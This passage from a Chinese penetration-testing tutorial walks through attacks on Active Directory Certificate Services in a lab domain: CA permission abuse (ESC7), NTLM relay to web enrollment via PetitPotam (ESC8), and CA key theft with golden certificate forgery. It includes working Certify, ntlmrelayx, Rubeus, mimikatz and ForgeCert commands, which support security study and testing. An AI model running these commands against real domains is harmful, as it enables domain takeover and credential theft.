C:\Users\Marcus\Desktop> certutil -config "CA_HOST\CA_NAME" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
```

### 0.6.7 Vulnerable Certificate Authority Access Control - ESC7

除了证书模板之外，证书颁发机构本身也具有一组保护各种 CA 操作的权限。可以从 `certsrv.msc` 中右键单击 CA，选择 “属性”，然后切换到 “安全” 选项卡即可访问这些权限，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/pThyPevm8YKgDES.png)

这里的两个主要权限是 “管理 CA”（ManageCA）权限和 “颁发和管理证书”（ManageCertificates）权限，拥有这两个权限的用户分别对应于 “CA 管理员” 和 “证书管理员”（有时称为 CA 官员）。

通过 PSPKI Cmdlet 的 Get-CertificationAuthority 和 Get-CertificationAuthorityAcl 模块可以枚举 CA 的访问控制项，相关命令如下。如下图所示，普通域用户 Marcus 对 CA 拥有 ManageCA 和 ManageCertificates 权限。

```powershell
Import-Module -Name PSPKI
Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/SjmNUkJsBo4CFnD.png)

Microsoft 和其他文献中对这些角色/权限进行了细分，但很难确定每个权限的确切安全含义。具体来说，很难确定攻击者如何远程滥用这些权限。技术规范 “*[MS-CSRA]: Certificate Services Remote Administration Protocol*” 在 “*3.1.1.7 Permissions*” 章节部分详细说明了 “CA 管理员” 和 “证书管理员” 权限可以针对 CA 远程执行的相关 DCOM 方法。

对于 CA 管理员权限，`ICertAdminD2::SetConfigEntry` 方法可以用于 “*...used to set the CA's persisted configuration data that is listed in section 3.1.1.10*” 中所提到的 CA 的持久配置数据。“*3.1.1.10 Configuration Data*” 节中包括 `Config_CA_Accept_Request_Attributes_SAN`，它在 “*[MS-WCCE] 3.2.1.1.4115*” 节中被定义为 “*A Boolean value that indicates whether  the CA accepts request attributes that specify the subject alternative name for the certificate  being requested*”。这正对应于在前文 “CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6” 部分所描述的 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志。

2020 年，PKIsolutions 发布了 PSPKI 的一些新增功能，以支持直接使用各种 AD CS (D)COM 接口，包括 `ICertAdminD2::SetConfigEntry`。PKISolutions 发布了一篇关于此类实现的文章 [*PowerShell PKI (PSPKI) 3.7 enhancements – Certification Authority API (part 1)*](https://www.pkisolutions.com/powershell-pki-pspki-3-7-enhancements-certification-authority-api-part-1/)，其中介绍了包括有关如何使用 `SetConfigEntry` 的有用示例。

因此，综上所述，如果攻击者在证书颁发机构 CA 上拥有具有 ManageCA 权限的主体，其可以使用 PSPKI 远程开启 `EDITF_ATTRIBUTESUBJECTALTNAME2` 位以允许在任何模板注册请求中设置 SAN。如下通过 PowerShell Cmdlet  完成该滥用过程。

```powershell
Import-Module PSPKI
$ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.pentest.com"
$ConfigReader.SetRootNode($true)
$ConfigReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$ConfigReader.SetConfigEntry(1376590, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

certutil -config "DC01.pentest.com\pentest-DC01-CA" -getreg "policy\EditFlags"
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Qk8i5C6PG9VEMYB.png)

如上图所示，成功为 CA 启用了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志位，后续的利用方法请参考前文的 “CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6” 部分。

下面，让我们继续讨论 ManageCertificates 权限，在“[MS-CSRA] 3.1.1.7” 节中其被称为 CA 官员权限。关于密钥归档（又称“密钥恢复代理”）有多种方法，本文不涉及这些方法。`ICertAdminD::ResubmitRequest` 方法可以 “*...resubmits  a specific pending or denied certificate request to the CA*”，这意味着拥有 ManageCertificates 权限的用户可以使挂起的证书注册请求得到批准，从而允许攻击者破坏并绕过证书模板设置中的 “CA 证书管理程序批准(C)” 保护。

下面，我们有一个名为 “ApproveReqTemplate” 的模板，其允许域身份验证并且在`mspki-certificate-name-flag` 属性中设置了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志。正常情况下我们可以按照前文 “Misconfigured Certificate Templates - ESC1” 的方法为域管理员的申请证书，但是该模板在发布要求中开启了 “CA 证书管理程序批准(C)” 保护，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/7rStfeyHjpU2LTC.png)

那么我们所有针对该模板的注册请求都将被挂起，直到管理员在 certsrv.msc 的 “挂起的申请” 中对该请求予以 “颁发” 或 “拒绝”。

如下图所示，我们通过 Certify 为 Administrator 用户申请证书，该请求随即被挂起，并得到此次请求的 Request ID 为 56，如下图所示。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:ApproveReqTemplate /altname:PENTEST\Administrator
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/jWJbUhs6tPIT83v.png)

此时，我们利用当前用户所拥有的 ManageCertificates 权限，通过 PSPKI Cmdlet 对 Request ID 为 56 的注册请求予以批准，相关命令如下。如下图所示，证书注册请求被 “颁发”。

```powershell
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-PendingRequest -RequestID 56 | Approve-CertificateRequest
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/6hfeIScAmklH5Rw.png)

然后再次通过 Certify 申请证书，并指定 Request ID 为 56，如下图所示，成功为 Administrator 用户注册到了 ApproveReqTemplate 模板的证书。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /id:56
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/oy6G9raBn8uPl4i.png)

### 0.6.8 NTLM Relay to AD CS HTTP Endpoints – ESC8

在前文中我们曾介绍过，管理员可以安装的 AD CS 服务器角色支持多种基于 HTTP 协议的证书注册方法，如下图所示。这些基于 HTTP 的证书注册接口易受 NTLM 中继（NTLM Relay）攻击。使用 NTLM Relay，失陷机器上的攻击者可以冒充任何 AD 帐户。 在冒充受害者帐户时，攻击者可以访问这些 Web 界面并根据用户/机器证书模板请求启用域身份验证的证书。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/iIqK8rUpGmQ4ByH.png)

Relay To AD CS 的攻击方案是完全可以实现的，因为这些证书注册 Web 接口支持 NTLM 身份验证并且没有启用任何 NTLM Relay 保护措施：

- 默认情况下，Web 注册界面（可在 `http://<caserver>/certsrv/` 访问的旧版 ASP 应用程序）仅支持 HTTP，它无法防止 NTLM 中继攻击。此外，它明确地只允许通过其 Authorization HTTP 标头进行 NTLM 身份验证，因此更安全的协议（如 Kerberos）不可用。
- 证书注册服务（CES）、证书注册策略（CEP）Web 服务和网络设备注册服务（NDES）默认支持通过其授权 HTTP 标头协商身份验证，协商身份验证支持 Kerberos 和 NTLM。因此，攻击者可以在 Relay 攻击期间协商到 NTLM 身份验证。这些 Web 服务至少默认启用 HTTPS，但不幸的是 HTTPS 本身并不能防止 NTLM 中继攻击。只有当 HTTPS 与通道绑定相结合时，才能保护 HTTPS 服务免受 NTLM 中继攻击。不幸的是，AD CS 没有为 IIS 上的身份验证启用扩展保护，这是启用通道绑定所必需的。

然而，攻击者在执行 NTLM Relay 攻击时往往会遇到的一个普遍问题，就是当发生入站身份验证并且攻击者中继它时，只有很短的时间来滥用它。特权帐户几乎只能对攻击者的机器进行一次身份验证。攻击者的工具可以尝试尽可能长时间地保持 NTLM 会话处于活动状态，但通常会话只能在短时间内使用。此外，身份验证会话受到限制，攻击者无法与强制执行 NTLM 签名的服务交互。

但是，攻击者可以通过 Relay 到 AD CS Web 界面来解决这些限制。攻击者可以使用 NTLM Relay 访问 AD CS Web 界面并为受害者账户请求客户端身份验证的证书。然后，攻击者可以通过 Kerberos 或 Schannel 进行身份验证，或者使用 PKINIT 窃取到受害者帐户的 NTLM 哈希。这巩固了攻击者对受害者帐户的长时间访问（即无论证书的有效期有多长），并且攻击者可以自由地使用多种身份验证协议对任何服务进行身份验证，而无需 NTLM 签名。

NTLM 中继攻击的另一个限制是它们需要受害者帐户才能对攻击者控制的机器进行身份验证。作为网络正常操作的一部分，攻击者可以耐心等待这种情况发生，或者攻击者可以强制帐户对失陷的机器进行身份验证。例如通过 [PrinterBug](https://github.com/dirkjanm/krbrelayx) 或 [PetitPotam](https://github.com/topotam/PetitPotam) 都可以强制目标主机的机器账户向攻击者控制的机器发起 NTLM 身份验证。如果我们强制域控制器的机器账户向攻击者控制器的恶意服务器发起 NTLM 身份验证，再将域控制器 NTLM 验证请求 Relay 到 AD CS Web 界面，就可以为域控制器申请一个 AD 证书，我们使用这个证书即可以域控制器的名义进行域身份验证，并获得域控制器所拥有的特权。

[Impacket](https://github.com/SecureAuthCorp/impacket) 套件中已经内置了 Relay To AD CS 的攻击功能，这里以下面的网络环境进行测试：

- AD CS 服务器
  - 主机名：ADCS
  - IP 地址：172.26.10.12
- 域控制器
  - 主机名：DC01
  - IP 地址：172.26.10.11
- 恶意服务器
  - 主机名：Kali Linux
  - IP 地址：172.26.10.134

在 Kali Linux 上执行以下命令，启动 ntlmrelayx.py 监听，如下图所示。

```bash
python3 ntlmrelayx.py -t http://172.26.10.12/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# --adcs 启用 AD CS Relay 攻击
# --template指定 AD CS 证书模板
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/YQwzSNTyt7HqiRg.png)

然后执行以下命令，通过 PetitPotam 迫使域控制器向 Kali Linux 发起 NTLM 身份验证，如下图所示。

```bash
python3 PetitPotam.py -d pentest.com -u Marcus -p Marcus\@123 172.26.10.134 172.26.10.11
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/sHQFnZTR5yLwoYS.png)

此时，ntlmrelayx.py 将截获域控机器账户 `DC01$` 的 Net-NTLM Hash，并将其中继到 ADCS 服务器的 Web 接口进行身份验证，之后将为 `DC01$` 帐户生成 Base64 格式的证书，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/qnVOAN2Zxc6u8ri.png)

将得到的证书复制下来，通过 Rubeus 请求 TGT 票据。在域内普通用户的机器上执行以下命令，申请域控机器帐户的 TGT 票据，并将票据传递到内存中，如下所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:<Base64 Certificate> /ptt
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/3jCkNUMd4TcixPs.png)

此时执行 `klist` 命令，当前主机内存中已经保存了 `DC01$` 账户的 TGT 票据，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/VAGgcWiKbBN3arh.png)

持有域控机器帐户的票据可以执行一些特权操作，例如通过 DCSync 转储域用户哈希，如下所示。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:pentest\administrator" exit
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/njViNrsHxTzKudG.png)

## 0.7 域持久性

当组织安装 AD CS 时，默认情况下，AD 启用基于证书的身份验证。要使用证书进行身份验证，CA 必须向帐户颁发包含允许域身份验证 EKU OID 的证书。当帐户使用证书进行身份验证时，AD 会验证证书是否链接到根 CA 和 `NTAuthCertificates` 对象指定的 CA 证书。

CA 使用其私钥签署已颁发的证书。如果我们窃取了这个私钥，我们是否可以伪造自己的证书并使用它们以组织中任何人的身份向 AD 进行身份验证呢？答案是肯定的。最初，这项技术是由 [Benjamin Delpy](https://twitter.com/gentilkiwi) 在 Mimikatz 和 Kekeo 中实现，如下图所示。之后，Specterops 在其白皮书中再次讨论了这个话题，并发布了一个 [ForgeCert](https://github.com/GhostPack/ForgeCert) 工具，这是一个 C# 工具，它可以获取 CA 根证书并为我们指定的任何用户伪造新证书。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/mYNXcI3g7RBfnhW.png)

Specterops 将该项技术称为 “黄金证书”（Golden Certificates）。

### 0.7.1 Forging Certificates with Stolen CA Certificates - DPERSIST1

企业 CA 具有证书和关联的私钥，它们被存储在 CA 服务器上。那么如何才能知道哪个证书是 CA 证书呢？这可以根据 CA 证书所拥有的几个特点来辨别：

- 如前所述，CA 证书存在于 CA 服务器本身，其私钥受机器 DPAPI 保护。
- 证书的颁发者和主题名称都设置为 CA 的专有名称。
- CA 证书并且只有 CA 证书具有 “CA 版本” 扩展名。
- CA 证书没有 EKU。

使用 Seatbelt 的 `Certificates` 命令可以枚举当前机器上存储的 CA 证书，如下图所示。

```console
C:\Users\Marcus\Desktop> Seatbelt.exe Certificates 
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Ewmp3I9B1xq8eHg.png)

要提取 CA 证书及其私钥，可以使用 CA 服务器上的 `certsrv.msc` 备份整个 CA，如下图所示。这会将 CA 证书导出为 p12 文件。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/9d6Qv8tbqCAImPT.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/vPxALsf5kCz7Qc8.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/WsQRpGwPOAjxerK.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/mLJZvfn9ypIrQEK.png)

除了通过 CA 备份之外，还有其他方法可以提取私钥。CA 证书和私钥在加密方面与其他机器证书没有任何不同，所以如果我们在 CA 服务器上获得了提升的权限，我们就可以像前文中介绍的窃取其他证书/密钥一样来提取它们。

例如可以通过 Mimikatz 来 Patch CAPI 和 CNG，以检索和导出证书及其私钥，相关命令如下。如下图所示，pentest-DC01-CA 这个证书的颁发者和主题名称都设置为 CA，很明显这是一个 CA 证书，Mimikatz 会将其导出并以 .der 和 .pfx 格式保存到磁盘上。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /systemstore:local_machine /store:my /export" exit
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/wTyH9Ep5gIz732d.png)

此外，也可以适用 SharpDPAPI 来执行此类操作，相关命令如下。

```console
C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates /machine
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/DvzWUaPb6o81KpB.png)

和之前一样，我们可以使用 openssl 将这个 .pem 格式的文本转换为可利用的 .pfx 格式，并保存为 ca.pfx 文件。有了这个包含 CA 证书和私钥 ca.pfx 文件后，攻击者可以将其上传到普通域成员机器上，并用它来伪造证书。

伪造证书的一种方法是将其导入单独的离线 CA 并使用 Mimikatz 的 `crypto::scauth` 命令生成并签署证书。或者，可以手动生成证书，以确保对每个字段进行精细控制，并且无需设置单独的系统。我们采用后一种方法，并使用 ForgeCert 工具来完成此过程。执行以下命令，通过前面窃取到的 ca.pfx 为域管理员用户 Administrator 注册证书。

```console
C:\Users\Marcus\Desktop> ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Passw0rd" --Subject "CN=User" --SubjectAltName "Administrator@pentest.com" --NewCertPath Administrator.pfx --NewCertPassword "NewPassw0rd"
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/PEflkojvz6Xa4ur.png)

如上图所示，最终生成的 Administrator.pfx 可用于前文所述的 SChannel 进行身份验证或使用 Rubeus 为伪造用户获取 TGT，如下所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\Administrator.pfx /password:NewPassw0rd /ptt
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/kOIwd5lActSgWNa.png)

值得注意的是，伪造证书时指定的目标用户需要在 AD 中激活/启用并且能够进行身份验证，也就是域内的活动用户。因此，尝试为 krbtgt 帐户伪造证书是行不通的。

伪造的证书将在指定的结束日期之前有效，只要根 CA 证书有效（这些 CA 证书的有效期从 5 年开始，但通常延长到 10 年以上）。这种滥用技术不仅适用于普通用户帐户，它也适用于机器帐户，如下所示。这意味着当与 S4U2Self、Pass the Ticket 或 DCSync 等技术结合使用时，只要 CA 证书有效，攻击者就可以在任何域机器上保持持久性。

```console
C:\Users\Marcus\Desktop> ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Passw0rd" --Subject "CN=User" --SubjectAltName "DC01$@pentest.com" --NewCertPath DC01.pfx --NewCertPassword "NewPassw0rd"

C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:C:\Users\Marcus\DC01.pfx /password:NewPassw0rd /ptt
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/plxa78fsHq3Ogjv.png)

### 0.7.2 Trusting Rogue CA Certificates - DPERSIST2

回顾一下前文 “Kerberos 身份验证和 NTAuthCertificates AD 容器” 这一节中介绍的 `NTAuthCertificates` 对象。此对象在其 `cacertificate` 属性中定义了一个或多个 CA 证书，AD 在身份验证期间使用它。正如 Microsoft 所描述的，在身份验证期间，域控制器会检查 `NTAuthCertificates` 对象是否包含在身份验证证书的颁发者字段中所指定的 CA 条目。如果是，则继续进行身份验证。如果证书不在 `NTAuthCertificates` 对象中，则身份验证失败。

伪造的另一种方法是生成自签名 CA 证书并将其添加到 `NTAuthCertificates` 对象。如果攻击者可以控制 `NTAuthCertificates` 对象（在默认配置中，只有 Enterprise Admins 组、Domain Admins 组和林根域中 Administrators 组的成员具有这些权限），则攻击者可以执行此操作。通过提升的访问权限，可以使用 certutil 从任何系统编辑 `NTAuthCertificates` 对象，相关命令如下。指定的证书应与前面介绍的 ForgeCert 伪造方法一起使用，以按需生成证书。

```console
C:\Users\Marcus\Desktop> certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA
```

在测试过程中，我们还必须使用 certutil 将证书添加到 RootCA 目录服务存储中，然后才能获得在 SChannel 上工作的伪造证书。但是，我们无法让这些伪造的证书适用于 PKINIT。无论如何，攻击者最好窃取现有的 CA 证书，而不是安装额外的恶意 CA 证书。

### 0.7.3 Malicious Misconfiguration - DPERSIST3

通过对 AD CS 组件的安全描述符进行修改，可以获得许多域持久性方法。前文 “域权限提升” 部分中描述的任何场景都可能由具有提升权限的攻击者恶意实施，以及向敏感组件添加控制权限（例如 WriteOwner/WriteDACL 等）。 这包括：

- CA 服务器的 AD 对象
- CA 服务器上的 RPC/DCOM 服务器
- AD 容器 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM>` 中的任何子代 AD 对象或容器。例如 Certificate Templates、Certificate Authorities、NTAuthCertificates等。
- AD 组默认或当前组织授予了控制 AD CS 的权限。例如内置的 Cert Publishers 组及其任何成员。

例如，在域中具有提升权限的攻击者可以将 WriteOwner 权限添加到默认的 User 证书模板，其中攻击者是该权限的主体。由于此时 User 模板的拥有者为攻击者自己，因此攻击者可以将模板上的 `mspki-certificate-name-flag` 属性设置为 1 以启用 `ENROLLEE_SUPPLIES_SUBJECT` 标志（即允许用户提供请求中的主题备用名称）。然后，攻击者可以注册模板，指定域管理员的账户名作为主题名称，并使用生成的证书作为 DA 进行身份验证，以在域内获得高特权。

AD CS 中基于访问控制的持久性的可能性是非常广泛的，并且由于组织目前没有有效的方法来审核与证书服务相关的权限，这一事实更加复杂。一旦 BloodHound 项目为 AD CS 集成了 Nodes 和 Edges，基于 ACL 的防御性审计对大多数组织来说应该会更容易。

## Ending......

参考文献：

> [*Certified Pre-Owned - Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
